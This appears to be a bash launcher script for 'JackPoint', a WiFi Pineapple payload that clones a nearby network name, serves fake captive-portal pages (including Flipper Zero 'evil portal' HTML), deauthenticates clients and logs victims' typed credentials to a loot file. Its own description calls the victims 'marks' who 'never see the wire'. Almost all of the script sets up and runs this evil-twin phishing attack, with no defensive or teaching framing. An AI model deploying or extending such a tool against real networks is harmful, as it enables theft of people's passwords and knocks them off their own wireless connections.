#!/bin/bash
# Title: JackPoint
# Description: Jack into the sprawl. Clone any SSID, load a ghost portal, watch the marks type their secrets in real time. Drop any Flipper Zero portal straight in — no limits. One radio spins the trap. The other hunts. Credentials logged to loot. They never see the wire.
# Author: wickedNull
# Version: 1.0
# Category: Interception

PAYLOAD_DIR="/root/payloads/user/interception/JackPoint"
PORTAL_DIR="$PAYLOAD_DIR/portals"
LOOT_DIR="$PAYLOAD_DIR/loot"
LOG_FILE="/tmp/jackpoint.log"
CRED_FILE="$LOOT_DIR/credentials.log"
NGINX_CONF="/tmp/jackpoint_nginx.conf"
HOSTAPD_CONF="/tmp/jackpoint_hostapd.conf"
DNSMASQ_CONF="/tmp/jackpoint_dnsmasq.conf"
ACTIVE_PORTAL="/tmp/jackpoint_active_portal"
CRED_PIPE="/tmp/jackpoint_creds"

AP_IFACE="wlan0"
DEAUTH_IFACE="wlan1mon"
AP_IP="192.168.4.1"
AP_SUBNET="192.168.4.0"
AP_NETMASK="255.255.255.0"
AP_DHCP_START="192.168.4.10"
AP_DHCP_END="192.168.4.50"
AP_CHANNEL="6"

# -- Find pagerctl -------------------------------------------------------------
PAGERCTL_FOUND=false
for dir in "$PAYLOAD_DIR/lib" \
           "/root/payloads/user/utilities/PAGERCTL" \
           "/mmc/root/payloads/user/utilities/PAGERCTL"; do
    if [ -f "$dir/libpagerctl.so" ] && [ -f "$dir/pagerctl.py" ]; then
        PAGERCTL_DIR="$dir"
        PAGERCTL_FOUND=true
        break
    fi
done

if [ "$PAGERCTL_FOUND" = false ]; then
    LOG "red" "libpagerctl.so / pagerctl.py not found!"
    LOG "Install PAGERCTL utility or copy files to:"
    LOG "  $PAYLOAD_DIR/lib/"
    WAIT_FOR_INPUT >/dev/null 2>&1
    exit 1
fi

if [ "$PAGERCTL_DIR" != "$PAYLOAD_DIR/lib" ]; then
    mkdir -p "$PAYLOAD_DIR/lib" 2>/dev/null
    cp "$PAGERCTL_DIR/libpagerctl.so" "$PAYLOAD_DIR/lib/" 2>/dev/null
    cp "$PAGERCTL_DIR/pagerctl.py"    "$PAYLOAD_DIR/lib/" 2>/dev/null
fi

export PATH="/mmc/usr/bin:$PAYLOAD_DIR/bin:$PATH"
export LD_LIBRARY_PATH="/mmc/usr/lib:/mmc/lib:$PAYLOAD_DIR/lib:$LD_LIBRARY_PATH"
export PYTHONPATH="$PAYLOAD_DIR/lib:$PAYLOAD_DIR:$PYTHONPATH"

PYTHON=$(command -v python3)

# -- Preflight checks ----------------------------------------------------------
mkdir -p "$PORTAL_DIR" "$LOOT_DIR" "$PAYLOAD_DIR/lib" 2>/dev/null

# Check for at least one portal
PORTAL_COUNT=$(find "$PORTAL_DIR" -name "*.html" 2>/dev/null | wc -l)
if [ "$PORTAL_COUNT" -eq 0 ]; then
    LOG ""
    LOG "red" "=== NO PORTALS FOUND ==="
    LOG ""
    LOG "Drop .html files into:"
    LOG "  $PORTAL_DIR"
    LOG ""
    LOG "Flipper Zero evil portal HTMLs work directly."
    LOG ""
    LOG "Press any button to exit..."
    WAIT_FOR_INPUT >/dev/null 2>&1
    exit 1
fi

# -- Splash --------------------------------------------------------------------
LOG ""
LOG "cyan" "  ░░ J A C K P O I N T ░░"
LOG ""
LOG "green" "Portals loaded : $PORTAL_COUNT"
LOG "green" "Loot path      : $CRED_FILE"
LOG ""
LOG "green" "GREEN = Jack In"
LOG "red"   "RED   = Exit"
LOG ""

while true; do
    BUTTON=$(WAIT_FOR_INPUT 2>/dev/null)
    case "$BUTTON" in
        "GREEN"|"A") break ;;
        "RED"|"B")
            LOG "Flatlined."
            exit 0
            ;;
    esac
done

# -- Stop services -------------------------------------------------------------
SPINNER_ID=$(START_SPINNER "Dropping services...")
/etc/init.d/php8-fpm       stop 2>/dev/null
/etc/init.d/nginx          stop 2>/dev/null
/etc/init.d/dnsmasq        stop 2>/dev/null
/etc/init.d/dnsmasq.hak5   stop 2>/dev/null
/etc/init.d/bluetoothd     stop 2>/dev/null
/etc/init.d/pineapplepager stop 2>/dev/null
sleep 0.5
STOP_SPINNER "$SPINNER_ID" 2>/dev/null

# -- Setup AP interface --------------------------------------------------------
# Take wlan0 out of monitor mode if needed, set it up as AP
ip link set "$AP_IFACE" down 2>/dev/null
iw dev wlan0mon del 2>/dev/null         # remove monitor vif on same radio
iw dev "$AP_IFACE" set type managed 2>/dev/null
ip link set "$AP_IFACE" up 2>/dev/null
ip addr flush dev "$AP_IFACE" 2>/dev/null
ip addr add "$AP_IP/24" dev "$AP_IFACE" 2>/dev/null

# -- Credential pipe -----------------------------------------------------------
rm -f "$CRED_PIPE"
mkfifo "$CRED_PIPE" 2>/dev/null

# -- Launch Python UI ----------------------------------------------------------
# Python handles: AP scan, SSID pick, portal pick, hostapd/dnsmasq/nginx
# orchestration, live cred display, deauth toggle, teardown
"$PYTHON" "$PAYLOAD_DIR/jackpoint.py" \
    --ap-iface    "$AP_IFACE" \
    --deauth-iface "$DEAUTH_IFACE" \
    --ap-ip       "$AP_IP" \
    --ap-channel  "$AP_CHANNEL" \
    --portal-dir  "$PORTAL_DIR" \
    --loot-file   "$CRED_FILE" \
    --cred-pipe   "$CRED_PIPE" \
    --hostapd-conf "$HOSTAPD_CONF" \
    --dnsmasq-conf "$DNSMASQ_CONF" \
    --nginx-conf  "$NGINX_CONF" \
    --active-portal "$ACTIVE_PORTAL" \
    > "$LOG_FILE" 2>&1

EXIT_CODE=$?

# -- Teardown ------------------------------------------------------------------
# Kill everything we started
kill $(cat /tmp/jackpoint_hostapd.pid 2>/dev/null) 2>/dev/null
kill $(cat /tmp/jackpoint_dnsmasq.pid 2>/dev/null) 2>/dev/null
kill $(cat /tmp/jackpoint_deauth.pid 2>/dev/null) 2>/dev/null
killall hostapd  2>/dev/null
killall dnsmasq  2>/dev/null

# Flush nftables rules we added
nft delete table ip jackpoint 2>/dev/null

# Restore AP interface
ip addr flush dev "$AP_IFACE" 2>/dev/null
ip link set "$AP_IFACE" down 2>/dev/null

# Cleanup temp files
rm -f "$CRED_PIPE" "$HOSTAPD_CONF" "$DNSMASQ_CONF" "$NGINX_CONF" "$ACTIVE_PORTAL"
rm -f /tmp/jackpoint_hostapd.pid /tmp/jackpoint_dnsmasq.pid /tmp/jackpoint_deauth.pid

if [ $EXIT_CODE -ne 0 ]; then
    LOG ""
    LOG "red" "JackPoint exited with error (code $EXIT_CODE)"
    LOG "red" "Check /tmp/jackpoint.log"
    LOG ""
    LOG "Press any button..."
    WAIT_FOR_INPUT >/dev/null 2>&1
fi

sleep 0.5

# -- Restore services ----------------------------------------------------------
/etc/init.d/dnsmasq        start 2>/dev/null &
/etc/init.d/dnsmasq.hak5   start 2>/dev/null &
/etc/init.d/bluetoothd     start 2>/dev/null &
/etc/init.d/nginx          start 2>/dev/null &
/etc/init.d/php8-fpm       start 2>/dev/null &
/etc/init.d/pineapplepager start 2>/dev/null &
